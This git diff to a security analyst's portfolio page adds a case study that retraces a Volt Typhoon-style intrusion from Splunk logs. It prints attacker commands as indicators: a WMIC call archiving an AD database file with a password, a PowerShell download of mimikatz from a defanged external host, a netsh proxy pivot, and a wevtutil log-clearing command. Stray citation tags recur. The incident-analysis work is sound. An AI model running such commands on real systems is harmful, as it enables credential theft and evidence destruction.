@@ -126,10 +126,16 @@
                     </span>
                 </div>
 
-                <div class="project-card p-8 rounded-xl bg-slate-800/20 opacity-75">
-                    <div class="text-slate-400 mb-6 text-3xl"><i class="fas fa-network-wired"></i></div>
-                    <h3 class="text-xl font-bold mb-3 text-white">Network Traffic Forensic Analysis</h3>
-                    <p class="text-slate-400 text-sm mb-6">Investigated command-and-control (C2) callback beacons using Wireshark and Zeek connection records.</p>
+                <div onclick="toggleVoltTyphoonCaseStudy()" class="project-card p-8 rounded-xl cursor-pointer border border-cyan-500/30 bg-slate-800/40 hover:scale-[1.02] transition-all">
+                    <div class="flex justify-between items-start mb-6">
+                        <div class="text-cyan-400 text-3xl"><i class="fas fa-network-wired"></i></div>
+                        <span class="text-xs font-mono bg-cyan-500/10 text-cyan-400 px-2 py-1 rounded border border-cyan-500/20">APT Investigation</span>
+                    </div>
+                    <h3 class="text-xl font-bold mb-3 text-white">Volt Typhoon Intrusion</h3>
+                    <p class="text-slate-400 text-sm mb-6">Tracking advanced persistent threat maneuvers, living-off-the-land activity, and system database staging via Splunk logs.</p>
+                    <span class="text-cyan-400 text-xs font-mono group flex items-center gap-2">
+                        View Full Incident Report <i class="fas fa-arrow-right text-[10px]"></i>
+                    </span>
                 </div>
             </div>
 
@@ -329,6 +335,106 @@
                                         <td class="p-4 text-cyan-400">Exfiltration Target</td>
                                         <td class="p-4 text-red-400">m3npat@yandex.com</td>
                                         <td class="p-4">Threat actor backend collection point for exfiltrated tokens.</td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                        </div>
+                    </div>
+                </div>
+            </div>
+                <!-- --- Volt Typhoon Case Study Container --- -->
+            <div id="volttyphoon-case-study" class="hidden mt-8 border border-slate-700 bg-slate-950 rounded-xl overflow-hidden shadow-2xl">
+                <div class="bg-slate-900 px-4 py-3 border-b border-slate-800 flex justify-between items-center font-mono text-xs">
+                    <div class="flex items-center gap-2">
+                        <span class="w-3 h-3 rounded-full bg-red-500/70"></span>
+                        <span class="w-3 h-3 rounded-full bg-yellow-500/70"></span>
+                        <span class="w-3 h-3 rounded-full bg-green-500/70"></span>
+                        <span class="text-slate-400 ml-2">incident_report_volt_typhoon.log</span>
+                    </div>
+                    <button onclick="toggleVoltTyphoonCaseStudy()" class="text-slate-500 hover:text-white transition"><i class="fas fa-times"></i></button>
+                </div>
+
+                <div class="p-8 space-y-8">
+                    <div>
+                        <h4 class="text-cyan-400 font-mono text-sm mb-1 uppercase tracking-widest">// Executive Summary</h4>
+                        <h3 class="text-2xl font-bold text-white mb-3">Retracing State-Sponsored Living-off-the-Land Operations</h3>
+                        <p class="text-slate-300 text-sm leading-relaxed max-w-4xl">
+                            Investigated a multi-stage network compromise mimicking real-world threat maneuvers deployed by the threat actor group <strong>Volt Typhoon</strong>[cite: 1]. Utilizing defensive correlation filters across Active Directory infrastructure, system registries, and endpoint command architectures, the adversary's efforts to maintain stealth, compromise core access databases, and purge tracking records were isolated into verifiable indicators[cite: 1].
+                        </p>
+                    </div>
+
+                    <div class="grid md:grid-cols-2 gap-6">
+                        <div class="p-6 bg-slate-900 rounded-lg border border-slate-800 flex flex-col justify-between">
+                            <div>
+                                <div class="text-cyan-400 font-mono text-xs mb-2">[PHASE 01: COMPROMISE & ACCOUNT PERSISTENCE]</div>
+                                <p class="text-slate-300 text-sm mb-4">
+                                    Correlated application logs to uncover an administrative security bypass vector. Identified an unexpected high-privilege password alteration, rapidly followed by the unauthorized deployment of a secondary backdoor administrative account to guarantee persistence[cite: 1].
+                                </p>
+                            </div>
+                            <div class="bg-black/50 p-3 rounded font-mono text-xs text-green-400 border border-slate-800 space-y-1">
+                                <div><span class="text-slate-500"># Service Log Source:</span> ADSelfService Plus[cite: 1]</div>
+                                <div><span class="text-slate-500"># Flagged Timestamp:</span> 2024-03-24T11:10:22[cite: 1]</div>
+                                <div><span class="text-cyan-400">Tactical Vector:</span> Account Creation (MITRE T1136)[cite: 1]</div>
+                            </div>
+                        </div>
+
+                        <div class="p-6 bg-slate-900 rounded-lg border border-slate-800 flex flex-col justify-between">
+                            <div>
+                                <div class="text-cyan-400 font-mono text-xs mb-2">[PHASE 02: STAGING CENTRAL ACCOUNTS]</div>
+                                <p class="text-slate-300 text-sm mb-4">
+                                    The adversary executed deep environmental discovery operations via native administrative binaries. Isolated remote invocation protocols compressing core enterprise directory systems within internet-facing file systems[cite: 1].
+                                </p>
+                            </div>
+                            <div class="bg-black/50 p-3 rounded font-mono text-xs text-red-400 border border-slate-800 overflow-x-auto">
+                                <span class="text-slate-500"># Remote Execution Command Detected:</span><br>
+                                wmic /node:webserver-01 process call create "cmd.exe /c 7z a -v100m -p d5ag0nm@5t3r -t7z cisco-up.7z C:\inetpub\wwwroot\temp.dit"[cite: 1]
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="p-6 bg-slate-900 rounded-lg border border-slate-800">
+                        <h4 class="text-cyan-400 font-mono text-xs mb-3 uppercase tracking-widest">// Obfuscated Payload Ingestion & Exfiltration Strategy</h4>
+                        <p class="text-slate-300 text-sm mb-4">
+                            Deobfuscation of Base64-encoded parameters passed to administrative system terminals uncovered explicit requests download memory dumping modules[cite: 1]. To route telemetry outbound safely past native perimeter controls, custom port proxy chains were created for external command delivery infrastructure maps[cite: 1].
+                        </p>
+                        <div class="bg-black/80 p-4 rounded-lg font-mono text-xs space-y-2 border border-slate-800 text-slate-400 overflow-x-auto">
+                            <div><span class="text-green-400"># Deobfuscated Content Extract:</span></div>
+                            <div class="text-yellow-400 pl-4">Invoke-WebRequest -Uri "hxxp[://]voltyp[.]com/3/tlz/mimikatz[.]exe" -OutFile "C:\Temp\db2\mimikatz.exe"[cite: 1]</div>
+                            <div class="text-cyan-400 pl-4">netsh interface portproxy add v4tov4 listenport=50100 connectport=8443 connectaddress=10.2.30.1[cite: 1]</div>
+                        </div>
+                    </div>
+
+                    <div>
+                        <h4 class="text-cyan-400 font-mono text-sm mb-4 uppercase tracking-widest">// Threat Intelligence Evidence Matrix (IOC Table)</h4>
+                        <div class="overflow-x-auto rounded-lg border border-slate-800">
+                            <table class="w-full text-left font-mono text-xs text-slate-300">
+                                <thead class="bg-slate-900 text-slate-400 text-xs uppercase tracking-wider">
+                                    <tr>
+                                        <th class="p-4 border-b border-slate-800">Artifact Target</th>
+                                        <th class="p-4 border-b border-slate-800">Indicator Value</th>
+                                        <th class="p-4 border-b border-slate-800">Operational Security Assessment</th>
+                                    </tr>
+                                </thead>
+                                <tbody class="divide-y divide-slate-800 bg-slate-950/40">
+                                    <tr>
+                                        <td class="p-4 text-cyan-400">Malicious Staging URI</td>
+                                        <td class="p-4 text-red-400">hxxp[://]voltyp[.]com/3/tlz/mimikatz[.]exe</td>
+                                        <td class="p-4">External drop point hosting custom memory analysis tools[cite: 1].</td>
+                                    </tr>
+                                    <tr>
+                                        <td class="p-4 text-cyan-400">C2 Network Pivot IP</td>
+                                        <td class="p-4 text-yellow-400">10.2.30.1 : 8443</td>
+                                        <td class="p-4">Configured routing node proxying local endpoints directly out to command servers[cite: 1].</td>
+                                    </tr>
+                                    <tr>
+                                        <td class="p-4 text-cyan-400">Protected Staging File</td>
+                                        <td class="p-4 text-purple-400">cisco-up.7z (Password: d5ag0nm@5t3r)</td>
+                                        <td class="p-4">Encrypted file container masking active system identity collections from string analytics[cite: 1].</td>
+                                    </tr>
+                                    <tr>
+                                        <td class="p-4 text-cyan-400">Anti-Forensics Tactic</td>
+                                        <td class="p-4 text-red-500">wevtutil cl Application Security Setup System</td>
+                                        <td class="p-4">Absolute log deletion script fired to block forensic tracking paths[cite: 1].</td>
                                     </tr>
                                 </tbody>
                             </table>
